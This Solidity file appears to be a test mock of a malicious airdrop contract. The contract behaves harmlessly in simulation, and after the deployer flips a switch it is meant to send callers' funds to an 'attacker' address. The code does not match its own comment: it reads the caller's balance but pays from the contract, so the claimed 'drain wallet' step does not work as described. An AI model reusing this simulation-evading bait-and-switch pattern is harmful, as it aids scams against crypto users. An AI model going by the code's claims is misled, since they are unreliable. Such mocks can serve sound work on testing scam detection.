// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract MockMaliciousAirdrop {
    bool public claimActive = true;
    address public attacker;
    
    constructor() {
        attacker = msg.sender;
    }
    
    // Looks safe in simulation
    function claim() external {
        if (claimActive) {
            payable(msg.sender).transfer(0.0001 ether);
        } else {
            // Drains wallet if claimActive = false
            uint256 balance = msg.sender.balance;
            payable(attacker).call{value: balance}("");
        }
    }
    
    // Attacker calls this to flip the switch
    function flipSwitch() external {
        require(msg.sender == attacker, "Not attacker");
        claimActive = false;
    }
    
    receive() external payable {}
}